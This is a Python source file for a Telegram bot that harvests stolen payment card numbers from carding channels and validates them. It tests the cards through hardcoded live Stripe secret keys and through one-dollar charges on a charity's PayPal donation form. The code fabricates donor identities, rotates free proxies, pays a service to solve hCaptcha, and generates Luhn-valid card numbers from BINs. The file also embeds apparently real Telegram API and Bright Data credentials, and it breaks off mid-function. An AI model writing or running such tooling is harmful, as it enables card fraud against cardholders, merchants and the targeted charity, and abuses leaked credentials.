#!/usr/bin/env python3
"""
Telegram Card Checker Bot – Fully working (xForce drops, hCaptcha via Bright Data)
GitHub: https://github.com/oxy-drops/Drops
"""

import re
import asyncio
import logging
import os
import random
import json
import aiohttp
import requests
import time
import hashlib
import subprocess
import sys
import shutil
import glob
import urllib.parse
import threading
from datetime import datetime, timezone
from threading import Thread
from typing import Dict, Optional, List

# ======================================================================
# FORCE LD_LIBRARY_PATH (fixes libnspr4.so missing on Replit)
# ======================================================================
def set_nix_library_path():
    if not (os.environ.get("REPL_ID") or os.path.exists("/home/runner/.replit")):
        return
    keywords = [
        "nspr", "nss", "atk", "at-spi2", "gtk3", "alsa-lib", "dbus", "glib",
        "libx11", "libxcb", "libxkbcommon", "libxcomposite", "libxdamage",
        "libxext", "libxfixes", "libxrandr", "expat", "cups",
        "mesa", "cairo", "pango",
    ]
    paths = set()
    try:
        nix_entries = os.listdir("/nix/store")
    except Exception:
        return
    for entry in nix_entries:
        lower = entry.lower()
        if lower.endswith(".drv") or lower.endswith("-dev") or lower.endswith("-doc"):
            continue
        for kw in keywords:
            if f"-{kw}-" in lower or lower.endswith(f"-{kw}"):
                lib_dir = f"/nix/store/{entry}/lib"
                if os.path.isdir(lib_dir):
                    paths.add(lib_dir)
                break
    if paths:
        existing = os.environ.get("LD_LIBRARY_PATH", "")
        os.environ["LD_LIBRARY_PATH"] = ":".join(paths) + (":" + existing if existing else "")
        print(f"[FIX] LD_LIBRARY_PATH updated with {len(paths)} Nix lib dirs.")

set_nix_library_path()

# ======================================================================
# Write replit.nix ONLY if missing or missing playwright (no infinite loop)
# ======================================================================
def ensure_replit_nix():
    nix_path = "replit.nix"
    if os.path.exists(nix_path):
        with open(nix_path, "r") as f:
            if "playwright" in f.read():
                return False  # already correct
    content = '''{ pkgs }: {
  deps = [
    pkgs.playwright
    pkgs.nss
    pkgs.nspr
    pkgs.atk
    pkgs.at-spi2-atk
    pkgs.cups
    pkgs.libdrm
    pkgs.libxkbcommon
    pkgs.mesa
    pkgs.xorg.libXcomposite
    pkgs.xorg.libXdamage
    pkgs.xorg.libXrandr
    pkgs.xorg.libXtst
    pkgs.xorg.libXScrnSaver
    pkgs.xorg.libX11
    pkgs.xorg.libxcb
    pkgs.gtk3
    pkgs.alsa-lib
    pkgs.dbus
    pkgs.expat
    pkgs.fontconfig
    pkgs.libXrender
    pkgs.libXfixes
    pkgs.libXcursor
    pkgs.libXi
    pkgs.pango
    pkgs.cairo
    pkgs.libGL
    pkgs.glib
    pkgs.libxshmfence
  ];
}
'''
    with open(nix_path, "w") as f:
        f.write(content)
    print("[PLAYWRIGHT] Created replit.nix. Please STOP and RUN your Repl again.")
    return True

if ensure_replit_nix():
    sys.exit(0)

# ======================================================================
# Auto‑install Chromium
# ======================================================================
def ensure_chromium_installed():
    cache_dirs = [
        os.path.expanduser("~/.cache/ms-playwright"),
        os.path.join(os.getcwd(), ".cache", "ms-playwright"),
    ]
    def _find_binary():
        for cache_dir in cache_dirs:
            for name in ["chrome", "chrome-headless-shell"]:
                try:
                    result = subprocess.run(["find", cache_dir, "-name", name, "-type", "f"], capture_output=True, text=True, timeout=5)
                    if result.stdout.strip():
                        return True
                except:
                    pass
        return False
    if _find_binary():
        print("[PLAYWRIGHT] Chromium already installed.")
        return True
    print("[PLAYWRIGHT] Installing Chromium (this may take 1-2 minutes)...")
    try:
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True, timeout=180)
        print("[PLAYWRIGHT] Chromium installation completed.")
        for _ in range(10):
            time.sleep(1)
            if _find_binary():
                print("[PLAYWRIGHT] Chromium binary found.")
                return True
    except Exception as e:
        print(f"[PLAYWRIGHT] Installation error: {e}")
    return False

# ======================================================================
# Playwright setup
# ======================================================================
CHROMIUM_INSTALLED = False
PLAYWRIGHT_OK = False
PLAYWRIGHT_EXECUTABLE_PATH = None

def find_chromium_executable():
    try:
        best = None
        for entry in os.listdir("/nix/store"):
            lower = entry.lower()
            if lower.endswith(".drv") or "-dev" in lower or "-doc" in lower:
                continue
            if re.match(r'^[a-z0-9]+-chromium-\d', lower) and "sandbox" not in lower:
                for name in ["chromium", "chromium-browser"]:
                    candidate = f"/nix/store/{entry}/bin/{name}"
                    if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                        if best is None or entry > best[0]:
                            best = (entry, candidate)
        if best:
            print(f"[PLAYWRIGHT] Using Nix chromium: {best[1]}")
            return best[1]
    except Exception:
        pass
    cache_dirs = [
        os.path.expanduser("~/.cache/ms-playwright"),
        os.path.join(os.getcwd(), ".cache", "ms-playwright"),
    ]
    for cache_dir in cache_dirs:
        for pattern in [
            os.path.join(cache_dir, "chromium-*/chrome-linux*/chrome"),
            os.path.join(cache_dir, "chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell"),
        ]:
            matches = glob.glob(pattern)
            if matches:
                return matches[0]
    return None

def create_wrapper_script(real_chrome_path):
    wrapper_dir = os.path.expanduser("~/playwright-wrapper")
    os.makedirs(wrapper_dir, exist_ok=True)
    wrapper_path = os.path.join(wrapper_dir, "chromium-wrapper.sh")
    ld_path = os.environ.get("LD_LIBRARY_PATH", "")
    content = f"""#!/bin/bash
export LD_LIBRARY_PATH="{ld_path}"
exec "{real_chrome_path}" "$@"
"""
    with open(wrapper_path, "w") as f:
        f.write(content)
    os.chmod(wrapper_path, 0o755)
    print(f"[PLAYWRIGHT] Wrapper created at {wrapper_path}")
    return wrapper_path

def setup_playwright():
    global CHROMIUM_INSTALLED, PLAYWRIGHT_OK, PLAYWRIGHT_EXECUTABLE_PATH
    CHROMIUM_INSTALLED = ensure_chromium_installed()
    if not CHROMIUM_INSTALLED:
        print("[PLAYWRIGHT] Chromium not installed – Playwright disabled.")
        return False
    chrome_path = find_chromium_executable()
    if not chrome_path:
        print("[PLAYWRIGHT] Chromium binary not found.")
        return False
    print(f"[PLAYWRIGHT] Found Chromium at {chrome_path}")
    is_nix = chrome_path.startswith("/nix/store/")
    executable = chrome_path if is_nix else create_wrapper_script(chrome_path)
    if not executable:
        return False
    if not is_nix:
        print(f"[PLAYWRIGHT] Wrapper created at {executable}")
    PLAYWRIGHT_EXECUTABLE_PATH = executable
    from playwright.sync_api import sync_playwright
    saved_ldpath = os.environ.pop("LD_LIBRARY_PATH", None)
    try:
        for label, path in [("primary", executable), ("fallback", chrome_path)]:
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(
                        headless=True,
                        executable_path=path,
                        args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                    )
                    browser.close()
                print(f"[PLAYWRIGHT] Playwright working ({label})!")
                PLAYWRIGHT_EXECUTABLE_PATH = path
                PLAYWRIGHT_OK = True
                return True
            except Exception as e:
                print(f"[PLAYWRIGHT] {label} failed: {str(e)[:120]}")
    finally:
        if saved_ldpath is not None:
            os.environ["LD_LIBRARY_PATH"] = saved_ldpath
    return False

from playwright.async_api import async_playwright as _real_async_playwright

class async_playwright:
    async def __aenter__(self):
        if PLAYWRIGHT_OK:
            self._ctx = _real_async_playwright()
            return await self._ctx.__aenter__()
        return self
    async def __aexit__(self, *args):
        if PLAYWRIGHT_OK and hasattr(self, "_ctx"):
            await self._ctx.__aexit__(*args)
    def chromium(self):
        class Dummy:
            async def launch(self, **kwargs):
                raise RuntimeError("Playwright unavailable")
        return Dummy()

# ======================================================================
# Bright Data CAPTCHA Solver (your API key)
# ======================================================================
BRIGHTDATA_API_KEY = "775da4e4-8ae3-42ae-a42b-1fb64299f664"
BRIGHTDATA_CAPTCHA_URL = "https://api.brightdata.com/captcha/v1/hcaptcha"

def solve_hcaptcha_brightdata(sitekey: str, page_url: str) -> Optional[str]:
    headers = {"Authorization": f"Bearer {BRIGHTDATA_API_KEY}", "Content-Type": "application/json"}
    payload = {"sitekey": sitekey, "pageurl": page_url, "method": "hcaptcha", "json": 1}
    try:
        response = requests.post(BRIGHTDATA_CAPTCHA_URL, headers=headers, json=payload, timeout=60)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "solved" and data.get("solution"):
                return data["solution"]["gRecaptchaResponse"]
        print(f"[CAPTCHA] Bright Data error: {response.status_code} - {response.text[:200]}")
        return None
    except Exception as e:
        print(f"[CAPTCHA] Bright Data exception: {e}")
        return None

# ======================================================================
# Proxy Manager (for Stripe & PayPal only)
# ======================================================================
class ProxyManager:
    _proxies: List[str] = []
    _index = 0
    _last_fetch = 0
    _fetch_interval = 300
    _lock = threading.Lock()

    @classmethod
    def _init_lock(cls):
        if cls._lock is None:
            import threading
            cls._lock = threading.Lock()

    @classmethod
    def _test_proxy(cls, proxy_url: str, timeout: int = 8) -> bool:
        try:
            r = requests.get("https://api.stripe.com/v1", proxies={"https": proxy_url}, timeout=timeout)
            return r.status_code in (200, 401)
        except Exception:
            return False

    @classmethod
    def fetch(cls) -> List[str]:
        cls._init_lock()
        with cls._lock:
            now = time.time()
            if now - cls._last_fetch < cls._fetch_interval and cls._proxies:
                return cls._proxies
            sources = [
                "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&timeout=8000",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            ]
            raw = []
            for url in sources:
                try:
                    r = requests.get(url, timeout=15)
                    raw += [l.strip() for l in r.text.strip().splitlines() if l.strip() and ":" in l]
                except Exception:
                    continue
            seen = set()
            candidates = []
            for p in raw:
                if "//" not in p:
                    p = "http://" + p
                if p not in seen:
                    seen.add(p)
                    candidates.append(p)
            tested = []
            for p in candidates[:40]:
                if cls._test_proxy(p):
                    tested.append(p)
            cls._proxies = tested
            cls._last_fetch = now
            cls._index = 0
            print(f"[ProxyManager] {len(tested)}/{len(candidates[:40])} working proxies")
            return tested

    @classmethod
    def get(cls) -> Optional[str]:
        cls._init_lock()
        with cls._lock:
            if not cls._proxies:
                return None
            proxy = cls._proxies[cls._index % len(cls._proxies)]
            cls._index += 1
            return proxy

    @classmethod
    def remove(cls, proxy_url: str):
        cls._init_lock()
        with cls._lock:
            if proxy_url in cls._proxies:
                cls._proxies.remove(proxy_url)

# ======================================================================
# Flask web server (for uptime)
# ======================================================================
from flask import Flask, jsonify
flask_app = Flask(__name__)
BOT_USERNAME = "Oxy"
PORT = int(os.environ.get("PORT", 8080))
RUN_MODE = os.environ.get("RUN_MODE", "both").lower()

@flask_app.route('/')
def home():
    return jsonify({"status": "alive", "bot": BOT_USERNAME, "playwright_ok": PLAYWRIGHT_OK})
@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy"})
def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

logging.basicConfig(filename="scraper.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger()

# ======================================================================
# Telegram configuration
# ======================================================================
API_ID = 37079398
API_HASH = "678f499b4345b640ba83ed7b1fc1efc0"
SESSION_NAME = "mysession"
WATCHED_CHATS_FILE = "watched_chats.json"

DEFAULT_SOURCE_CHATS = [
    "https://t.me/+01N1N0nFYEA4MWRl",
    "newscrapper4",
    "cc_checker_Stuff",
    "xForceDropsBot",
    "X-Force Group",          # <-- watches X-Force Group by title
]

def _load_watched_chats():
    if os.path.exists(WATCHED_CHATS_FILE):
        try:
            with open(WATCHED_CHATS_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return list(DEFAULT_SOURCE_CHATS)

def _save_watched_chats(chats):
    try:
        with open(WATCHED_CHATS_FILE, "w") as f:
            json.dump(chats, f)
    except Exception:
        pass

SOURCE_CHATS_RAW = _load_watched_chats()
XFORCE_BOT_USERNAME = "xForceDropsBot"
FORWARD_TARGET = "OxyCondoneIt"

from telethon import TelegramClient, events
from telethon.errors import UserAlreadyParticipantError, FloodWaitError, MessageDeleteForbiddenError
from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest
from telethon.tl.types import KeyboardButtonUrl

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

# ======================================================================
# Card detection patterns (including long pipe format)
# ======================================================================
CARD_RE_SIMPLE = re.compile(r"\b(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]\s*(\d{3,4})\b")
CARD_RE_FORMATTED = re.compile(r"[❃]?\s*𝗖𝗮𝗿𝗱\s*[➜-]?\s*`?(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]\s*(\d{3,4})")
CARD_RE_LOOSE = re.compile(r"(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]?\s*(\d{3,4})?")

def extract_card_from_text(text: str):
    # Try to match the long pipe format (with name, address, etc.)
    long_match = re.search(r'(\d{15,16})\|(\d{2})\|(\d{3,4})\|([A-Za-z ]+)', text)
    if long_match:
        card = long_match.group(1)
        mm = long_match.group(2)
        cvv = long_match.group(3)
        # Find year in nearby text (often after cvv)
        year_match = re.search(rf'{re.escape(card)}\|\d{{2}}\|\d{{3,4}}\|.*?\|(\d{{2,4}})', text)
        if year_match:
            yy = year_match.group(1)
            if len(yy) == 2:
                yy = f"20{yy}"
            return (card, mm, yy, cvv)
    # Fallback to regular patterns
    for pattern in [CARD_RE_SIMPLE, CARD_RE_FORMATTED, CARD_RE_LOOSE]:
        m = pattern.search(text)
        if m:
            groups = m.groups()
            if len(groups) >= 4:
                card = groups[0]; mm = groups[1]; yy = groups[2]; cvv = groups[3] or "000"
                if len(cvv) < 3: cvv = "000"
                if len(yy) == 2: yy = f"20{yy}"
                return (card, mm, yy, cvv)
            elif len(groups) >= 3:
                card = groups[0]; mm = groups[1]; yy = groups[2]; cvv = "000"
                if len(yy) == 2: yy = f"20{yy}"
                return (card, mm, yy, cvv)
    return None

# ======================================================================
# BIN lookup
# ======================================================================
async def get_bin_info(bin6: str) -> dict:
    url = f"https://lookup.binlist.net/{bin6}"
    headers = {"Accept-Version": "3"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    return {
                        "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                        "brand": data.get("scheme", "UNKNOWN").upper(),
                        "type": data.get("type", "UNKNOWN").upper(),
                        "country": data.get("country", {}).get("name", "Unknown"),
                        "country_code": data.get("country", {}).get("alpha2", "XX"),
                        "prepaid": data.get("prepaid", False),
                        "level": data.get("brand", "STANDARD").upper(),
                    }
    except: pass
    return None

# ======================================================================
# Stripe Authorizer
# ======================================================================
STRIPE_KEYS = [
    "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",
    "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"
]

def stripe_authorize(card_str: str) -> str:
    parts = card_str.split("|")
    if len(parts) < 4: return "ERROR|Invalid format"
    number, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
    if len(year) == 2: year = "20" + year
    for key in STRIPE_KEYS:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"type": "card", "card[number]": number, "card[exp_month]": month, "card[exp_year]": year, "card[cvc]": cvc}
        proxy = ProxyManager.get()
        proxies = {"https": proxy} if proxy else None
        for attempt in range(3):
            try:
                response = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=15, proxies=proxies)
                if response.status_code == 429:
                    if proxy: ProxyManager.remove(proxy)
                    proxy = ProxyManager.get()
                    proxies = {"https": proxy} if proxy else None
                    time.sleep(2)
                    continue
                if response.status_code == 200:
                    return "AUTHORIZED ✅|PaymentMethod created"
                elif response.status_code == 402:
                    err = response.json().get("error", {}).get("message", "Card declined")
                    return f"DECLINED ❌|{err}"
                else:
                    err_msg = response.json().get("error", {}).get("message", "Unknown error")
                    if "incorrect" in err_msg.lower() or "invalid" in err_msg.lower():
                        return f"DECLINED ❌|{err_msg}"
                    break
            except requests.exceptions.ProxyError:
                if proxy: ProxyManager.remove(proxy)
                proxy = ProxyManager.get()
                proxies = {"https": proxy} if proxy else None
                continue
            except Exception:
                continue
    return "ERROR|All Stripe keys failed"

# ======================================================================
# PayPal Charger (with proxy and random donor)
# ======================================================================
FORM_VIEW_URL = "https://binnaclehouse.org/?givewp-route=donation-form-view&form-id=3945"
AJAX_URL = "https://binnaclehouse.org/wp-admin/admin-ajax.php"
FORM_ID = "3945"
_BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

class PayPalCharger:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.headers.update(_BASE_HEADERS)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self._proxy = proxy

    def _random_donor(self) -> Dict[str, str]:
        first_names = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen","Nancy","Lisa","Betty","Helen","Sandra","Donna","Carol","Ruth","Sharon","Michelle","Laura","Sarah","Kimberly","Deborah","Jessica","Shirley","Cynthia","Angela","Melissa","Brenda","Amy","Anna","Rebecca","Virginia","Kathleen","Pamela","Martha","Debra","Amanda","Stephanie","Carolyn","Christine","Marie","Janet","Catherine","Frances","Ann","Joyce","Diane","Alice","Julie","Heather","Teresa","Doris","Gloria","Evelyn","Jean","Cheryl","Mildred","Katherine","Joan","Ashley","Judith","Rose","Janice","Karen","Nicole","Judy","Christina","Diana","Paula","Shirley","Emily","Robin","Alice","Beverly","Denise","Marilyn","Andrea","Kathryn","Louise","Sara","Anne","Jacqueline","Wanda","Bonnie","Julia","Ruby","Lois","Tina","Phyllis","Norma"]
        last_names = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores","Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts","Gomez","Phillips","Evans","Turner","Diaz","Parker","Cruz","Edwards","Collins","Reyes","Stewart","Morris","Morales","Murphy","Cook","Rogers","Gutierrez","Ortiz","Morgan","Cooper","Peterson","Bailey","Reed","Kelly","Howard","Ramos","Kim","Cox","Ward","Richardson","Watson","Brooks","Chavez","Wood","James","Bennett","Gray","Mendoza","Ruiz","Hughes","Price","Alvarez","Castillo","Sanders","Patel","Myers","Long","Ross","Foster","Jimenez"]
        streets = ["142 Maple Ave","87 Oak Street","1204 Pine Rd","330 Birch Blvd","560 Cedar Lane","92 Elm Drive","415 Walnut St","73 Willow Way","218 Chestnut Ct","884 Spruce Blvd","11 Harbor View","657 Sunset Dr","329 Lakeview Rd","50 Hillcrest Ave","740 Riverside Dr"]
        cities = ["Springfield","Columbus","Charlotte","Phoenix","Austin","Denver","Nashville","Portland","Louisville","Memphis","Seattle","Las Vegas","Minneapolis","San Antonio","Jacksonville"]
        states = ["IL","OH","NC","AZ","TX","CO","TN","OR","KY","TN","WA","NV","MN","TX","FL"]
        postals = ["62701","43201","28201","85001","73301","80201","37201","97201","40201","38101","98101","89101","55401","78201","32201"]
        index = random.randint(0, len(streets)-1)
        first = random.choice(first_names)
        last = random.choice(last_names)
        line1 = streets[index]
        city = cities[index]
        state = states[index]
        postal = postals[index]
        email = f"{first.lower()}.{last.lower()}{random.randint(10,9999)}@gmail.com"
        phone = f"{random.choice(['206','312','404','512','614','702','803','904','214','303'])}{random.randint(1000000,9999999)}"
        return {
            "first_name": first,
            "last_name": last,
            "email": email,
            "line1": line1,
            "city": city,
            "state": state,
            "postal": postal,
            "phone": phone,
        }

    def _get_form_data(self, retries=3):
        for attempt in range(retries):
            try:
                self.session.get("https://binnaclehouse.org/donation/", timeout=15)
                r = self.session.get(FORM_VIEW_URL, timeout=20)
                r.raise_for_status()
                m = re.search(r"window\.givewpDonationFormExports\s*=\s*(\{.*?\});\s*[\n\r]", r.text, re.S)
                if not m:
                    raise RuntimeError("givewpDonationFormExports block not found")
                blob = m.group(1)
                def _extract(key):
                    match = re.search(rf'"{key}"\s*:\s*"([^"]+)"', blob)
                    return match.group(1).replace("\\/", "/") if match else ""
                nonce = _extract("donationFormNonce")
                client_id = _extract("clientId")
                if not nonce or not client_id:
                    raise RuntimeError("Missing nonce or clientId")
                return {"nonce": nonce, "client_id": client_id}
            except Exception as e:
                if attempt == retries-1:
                    raise
                time.sleep(2)
                self.session = requests.Session()
                self.session.headers.update(_BASE_HEADERS)
                if self._proxy:
                    self.session.proxies = {"http": self._proxy, "https": self._proxy}

    def _create_order(self, nonce, retries=3):
        for attempt in range(retries):
            try:
                resp = self.session.post(
                    AJAX_URL,
                    params={"action": "give_paypal_commerce_create_order"},
                    data={
                        "give-honeypot": "",
                        "give-form-id": FORM_ID,
                        "give-form-hash": nonce,
                        "give-form-id-prefix": f"give-{FORM_ID}-0",
                        "give-amount": "1.00",
                        "give-gateway": "paypal-commerce",
                        "payment-mode": "paypal-commerce",
                    },
                    headers={"X-Requested-With": "XMLHttpRequest"},
                    timeout=30,
                )
                res = resp.json()
                if res.get("success") and "data" in res:
                    return res["data"]["id"]
                raise RuntimeError(f"Order creation failed: {resp.text[:150]}")
            except Exception as e:
                if attempt == retries-1:
                    raise
                time.sleep(2)
                self.session = requests.Session()
                self.session.headers.update(_BASE_HEADERS)
                if self._proxy:
                    self.session.proxies = {"http": self._proxy, "https": self._proxy}

    def _submit_payment(self, order_id, n, mm, yy, cvc, donor):
        ua = self.session.headers["User-Agent"]
        headers = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "X-App-Name": "standardcardfields",
            "Paypal-Client-Metadata-Id": order_id,
            "User-Agent": ua,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
        }
        query = """
        mutation payWithCard($token: String! $card: CardInput $phoneNumber: String $firstName: String $lastName: String
            $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType) {
            approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName
                lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType) { flags { is3DSecureRequired } cart { cartId } } }
        """
        address = {
            "givenName": donor["first_name"],
            "familyName": donor["last_name"],
            "line1": donor["line1"],
            "line2": None,
            "city": donor["city"],
            "state": donor["state"],
            "postalCode": donor["postal"],
            "country": "US",
        }
        card_type = self._detect_card_type(n)
        full_year = yy if len(yy) == 4 else f"20{yy}"
        phone = donor["phone"]
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": n,
                "type": card_type,
                "expirationDate": f"{mm}/{full_year}",
                "postalCode": donor["postal"],
                "securityCode": cvc,
            },
            "phoneNumber": phone,
            "firstName": donor["first_name"],
            "lastName": donor["last_name"],
            "email": donor["email"],
            "billingAddress": address,
            "shippingAddress": address,
            "currencyConversionType": "PAYPAL",
        }
        try:
            self.session.get(f"https://www.paypal.com/smart/card-fields?token={order_id}&env=production",
                             headers={"Referer": "https://binnaclehouse.org/donation/", "Accept": "text/html"}, timeout=15)
        except: pass
        for use_proxy in [True, False]:
            if not use_proxy and self._proxy:
                self.session.proxies = None
                print("[PayPal] Retrying without proxy")
            for attempt in range(3):
                try:
                    resp = self.session.post(
                        "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                        headers=headers,
                        json={"query": query, "variables": variables},
                        timeout=60,
                    )
                    if resp.status_code == 429:
                        time.sleep(int(resp.headers.get("Retry-After", 10)))
                        continue
                    if resp.status_code == 200:
                        try:
                            res = resp.json()
                            if "errors" in res:
                                err_msg = res["errors"][0].get("message", "Unknown")
                                code = res["errors"][0].get("data", [{}])[0].get("code", "")
                                full = f"{err_msg} ({code})" if code else err_msg
                                hits = ["INVALID_BILLING_ADDRESS", "INVALID_SECURITY_CODE", "CVV2_FAILURE",
                                        "INSTRUMENT_DECLINED", "DO_NOT_HONOR", "3D_SECURE"]
                                if any(k in full.upper() for k in hits):
                                    return f"APPROVED|{full}"
                                return f"DECLINED|{full}"
                            if res.get("data", {}).get("approveGuestPaymentWithCreditCard"):
                                return "CHARGED|Payment successful"
                            return f"UNKNOWN|{resp.text[:150]}"
                        except Exception as e:
                            return f"PARSE_ERROR|{e}"
                    else:
                        continue
                except requests.exceptions.ProxyError:
                    break
                except Exception as e:
                    if attempt == 2:
                        return f"ERROR|{e}"
                    time.sleep(2)
        return "DECLINED|No response after all retries"

    @staticmethod
    def _detect_card_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"): return "VISA"
        if re.match(r"^5[1-5]|^2[2-7]", n): return "MASTER_CARD"
        if n.startswith(("34", "37")): return "AMEX"
        if n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
        return "VISA"

    def charge(self, cc: str) -> str:
        parts = cc.strip().split("|")
        if len(parts) < 4:
            return "ERROR|Invalid format"
        n, mm, yy, cvc = parts[:4]
        if len(yy) == 4:
            yy = yy[2:]
        donor = self._random_donor()
        logger.info(f"[PayPal] Checking {n[:4]}...{n[-4:]} with donor {donor['first_name']} {donor['last_name']}")
        try:
            form_data = self._get_form_data()
            order_id = self._create_order(form_data["nonce"])
            result = self._submit_payment(order_id, n, mm, yy, cvc, donor)
            logger.info(f"[PayPal] Result: {result[:80]}")
            return result
        except Exception as e:
            logger.error(f"[PayPal] ERROR: {e}")
            return f"ERROR|{e}"

# ======================================================================
# Card generation (Luhn)
# ======================================================================
def luhn_sum(card: str) -> int:
    total = 0
    for i, ch in enumerate(card[::-1]):
        n = int(ch)
        if i % 2 == 1: n *= 2
        if n > 9: n -= 9
        total += n
    return total

def generate_card_number(bin_prefix: str) -> str:
    bin_prefix = bin_prefix[:6]
    is_amex = bin_prefix[:2] in ("34", "37")
    length = 15 if is_amex else 16
    fill_len = length - len(bin_prefix) - 1
    body = bin_prefix + "".join(str(random.randint(0,9)) for _ in range(fill_len))
    for check in range(10):
        candidate = body + str(check)
        if luhn_sum(candidate) % 10 == 0: return candidate
    return body + "0"

def generate_expiry():
    return f"{random.randint(1,12):02d}", str(random.randint(2025,2032))

def generate_cvv(card: str) -> str:
    return str(random.randint(1000,9999)) if card[:2] in ("34","37") else str(random.randint(100,999))

def generate_card_with_bin(bin_prefix: str) -> str:
    card = generate_card_number(bin_prefix)
    mm, yy = generate_expiry()
    cvv = generate_cvv(card)
    return f"{card}|{mm}|{yy}|{cvv}"

# ======================================================================
# xForce automation (no proxy, 60s timeout, improved extraction)
# ======================================================================
def xlog(tag, msg):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] [xForce/{tag}] {msg}", flush=True)
    logger.info(msg)

DEDUP_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xforce_dedup.json")
SCREENSHOTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "screenshots")
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

class XForceAutomator:
    RETRY_LIMIT = 3
    RETRY_TIMEOUT = 30
    def __init__(self, bot_client, target_group):
        self.bot_client = bot_client
        self.target_group = target_group
        self.processed_links = set()
        self.processed_cards = set()
        self._drop_queue = asyncio.Queue()
        self._worker_task = None
        self._pending = {}
        self._load_state()
    def _log(self, tag, msg): xlog(tag, msg)

    def _load_state(self):
        try:
            with open(DEDUP_FILE, "r") as f:
                data = json.load(f)
            self.processed_links = set(data.get("links", []))
            self.processed_cards = set(data.get("cards", []))
            self._log("dedup", f"Loaded {len(self.processed_links)} links, {len(self.processed_cards)} cards from disk")
        except FileNotFoundError:
            self._log("dedup", "No dedup file found — starting fresh")
        except Exception as e:
            self._log("dedup", f"Could not load dedup file: {e} — starting fresh")

    def _save_state(self):
        try:
            with open(DEDUP_FILE, "w") as f:
                json.dump({"links": list(self.processed_links), "cards": list(self.processed_cards)}, f)
        except Exception as e:
            self._log("dedup", f"Could not save dedup file: {e}")

    async def _save_screenshot(self, page, reason: str):
        try:
            ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
            slug = re.sub(r'[^a-z0-9]+', '_', reason.lower())[:40]
            path = os.path.join(SCREENSHOTS_DIR, f"{ts}_{slug}.png")
            await page.screenshot(path=path, full_page=True)
            self._log("screenshot", f"Saved: screenshots/{os.path.basename(path)}")
        except Exception as e:
            self._log("screenshot", f"Could not save screenshot: {e}")

    async def solve_hcaptcha_brightdata(self, page):
        try:
            iframe = await page.wait_for_selector('iframe[src*="hcaptcha"]', timeout=10000)
            if not iframe:
                self._log("captcha", "No hCaptcha iframe found after waiting")
                return False
            src = await iframe.get_attribute("src")
            sitekey = None
            if src:
                parsed = urllib.parse.urlparse(src)
                params = urllib.parse.parse_qs(parsed.query)
                sitekey = params.get("sitekey", [None])[0]
            if not sitekey:
                sitekey = await page.evaluate("""() => {
                    const el = document.querySelector('[data-sitekey]');
                    return el ? el.getAttribute('data-sitekey') : null;
                }""")
            if not sitekey:
                self._log("captcha", "Could not extract sitekey")
                return False
            self._log("captcha", f"Sitekey: {sitekey[:30]}... calling Bright Data API")
            token = solve_hcaptcha_brightdata(sitekey, page.url)
            if not token:
                self._log("captcha", "Bright Data API returned no token")
                return False
            await page.evaluate(f"""
                () => {{
                    const response = '{token}';
                    const respElement = document.querySelector('[name="h-captcha-response"]');
                    if (respElement) respElement.value = response;
                    const captchaElem = document.querySelector('.h-captcha');
                    if (captchaElem) {{
